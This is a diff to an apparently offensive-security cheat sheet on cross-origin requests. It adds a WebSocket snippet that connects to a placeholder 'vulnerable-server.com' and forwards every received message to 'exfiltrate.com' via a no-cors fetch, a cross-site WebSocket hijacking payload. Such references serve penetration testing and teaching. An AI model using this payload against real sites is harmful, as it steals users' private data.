@@ -114,3 +114,26 @@ xhr.send(JSON.stringify(data));
   The XMLHttpRequest.withCredentials (`xhr.withCredentials = true;`) property is a boolean value that indicates whether or not cross-site Access-Control requests should be made using credentials such as cookies, authorization headers or TLS client certificates. Setting withCredentials has no effect on same-site requests.
 
 > More information on [developer.mozilla.org](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest).
+
+## WebSocket
+
+### Receiving and sending data
+
+```js
+let ws = new WebSocket("wss://vulnerable-server.com/chat");
+
+ws.onopen = (event) => {
+  ws.send("READY")
+};
+
+ws.onmessage = (event) => {
+  fetch('https://exfiltrate.com', {
+  	method: 'POST',
+	mode: 'no-cors',
+	headers: {
+		'Content-Type': 'application/json'
+	},
+  	body: event.data
+  });
+}
+```
